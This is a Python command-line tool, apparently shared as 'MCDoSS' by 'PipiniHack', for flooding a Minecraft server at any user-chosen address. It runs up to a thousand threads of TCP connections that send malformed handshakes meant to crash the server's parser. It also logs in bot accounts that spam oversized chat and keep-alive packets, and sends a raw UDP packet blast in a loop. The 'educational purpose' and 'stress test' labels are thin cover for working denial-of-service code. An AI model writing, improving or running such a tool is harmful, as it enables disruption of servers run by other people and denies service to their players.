#!/usr/bin/env python3
from minecraft.networking.connection import Connection
from minecraft.networking.packets.serverbound.play import ChatPacket, KeepAlivePacket
import threading, time, random, socket
from scapy.layers.inet import IP, UDP
from scapy.packet import Raw
from scapy.sendrecv import send
import os
import socket


config = {
    "HOST": "127.0.0.1",
    "PORT": 25565,
    "THREADS": 1000,
    "DURATION": 60
}

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def mcdos():
    print("""      
    '||    ||'   ..|'''.| '||''|.    ..|''||    .|'''.|   .|'''.|  
     |||  |||  .|'     '   ||   ||  .|'    ||   ||..  '   ||..  '  
     |'|..'||  ||          ||    || ||      ||   ''|||.    ''|||.  
     | '|' ||  '|.      .  ||    || '|.     || .     '|| .     '|| 
    .|. | .||.  ''|....'  .||...|'   ''|...|'  |'....|'  |'....|'  
                Minecraft Bot & Packet sender  By PipiniHack
                !Use only for educational purpose!

            """)
def pipini():
    print("""        
     ______ __         __         __ _______              __    
    |   __ \__|.-----.|__|.-----.|__|   |   |.---.-.----.|  |--.
    |    __/  ||  _  ||  ||     ||  |       ||  _  |  __||    < 
    |___|  |__||   __||__||__|__||__|___|___||___._|____||__|__|
               |__|       Made In Italy                                      

    TG: @YoungestMoonstar - GitHub: /PipinoMat""")


def verifica(config):
    host = config["HOST"]
    port = config["PORT"]

    print(f"\n🔎 Verifica connessione {host}:{port}...\n")

    s = socket.socket()
    s.settimeout(2)

    try:
        s.connect((host, port))
        print("✅ Connessione riuscita")
    except Exception as e:
        print("❌ Errore:", e)
    finally:
        s.close()


def main(config):
    clear()
    print("\n🚀 PROGRAMMA AVVIATO")
    print(config)

    HOST = config["HOST"]
    PORT = config["PORT"]
    THREADS = config["THREADS"]
    DURATION = config["DURATION"]
    FLOOD_ACTIVE = True

    def tcp_handshake_flood():
        """Pre-auth SYN flood"""
        while FLOOD_ACTIVE:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            try:
                s.connect((HOST, PORT))
                # Malformed handshake (crash parser)
                hs = b'\x00\x04RELISERELISE' + HOST.encode() + b'\x00\xFF\x00\x0F\x00\x1F'
                s.send(hs)
            except:
                pass
            finally:
                s.close()

    def conn_spam():
        """Login + packet burst"""
        while FLOOD_ACTIVE:
            try:
                conn = Connection(HOST, PORT, username=f"PipiniHack{random.randint(0, 99999)}")
                conn.connect()
                time.sleep(1)  # Post-login

                # Oversize chat (CPU spike)
                for _ in range(50):
                    chat = ChatPacket()
                    chat.message = "§§§" * 500 + chr(0xFF)  # Color codes + null crash
                    conn.write_packet(chat)

                # KeepAlive leak
                for _ in range(100):
                    ka = KeepAlivePacket()
                    ka.id = random.randint(0, 2 ** 32 - 1)
                    conn.write_packet(ka)

                conn.disconnect()
            except:
                pass

    def udp_nuke():
        """Raw UDP blast (bypassa TCP stack)"""
        pkt = IP(dst=HOST) / UDP(dport=PORT) / Raw(load=b'\xfe\x01' + b'\x00' * 1024)  # Legacy ping spam
        send(pkt, loop=1, inter=0.0001, verbose=0)

    print(f"🎯 TARGET: {HOST}:{PORT} - {THREADS} threads x {DURATION}s")
    print("🚀 Avvio flood... Monitora con curl https://api.mcsrvstat.us/2/{HOST}")

    # Lancio threads
    for _ in range(THREADS):
        threading.Thread(target=conn_spam, daemon=True).start()
        threading.Thread(target=tcp_handshake_flood, daemon=True).start()

    threading.Thread(target=udp_nuke, daemon=True).start()

    time.sleep(DURATION)
    FLOOD_ACTIVE = False
    print("✅ Stress test completato")

    print("\n⏳ Esecuzione...")


def set_values():
    clear()
    print("\n⚙️ IMPOSTA CONFIGURAZIONE")

    config["HOST"] = input("HOST (es. mc.yourserver.it): ") or config["HOST"]
    config["PORT"] = int(input("PORT (default port 25565): ") or config["PORT"])
    config["THREADS"] = int(input("THREADS (power of doss def 1000): ") or config["THREADS"])
    config["DURATION"] = int(input("DURATION in sec.: ") or config["DURATION"])

    print("✔ Config salvata!")


def menu():
    pipini()
    while True:
        mcdos()

        print("=== MENU PRINCIPALE ===")
        print("1. Imposta variabili")
        print("2. Avvia programma")
        print("3. Mostra configurazione")
        print("4. Verifica NC server")
        print("5. Esci")

        choice = input("Scelta: ")

        if choice == "1":
            set_values()
            clear()

        elif choice == "2":
            clear()
            main(config)

        elif choice == "3":
            clear()
            print("\n📦 CONFIG:")
            for k, v in config.items():
                print(f"{k}: {v}")

        elif choice == "4":
            clear()
            verifica(config)

        elif choice == "5":
            clear()
            print("Uscita...")
            break

        else:
            print("❌ Scelta non valida")

if __name__ == "__main__":
    menu()
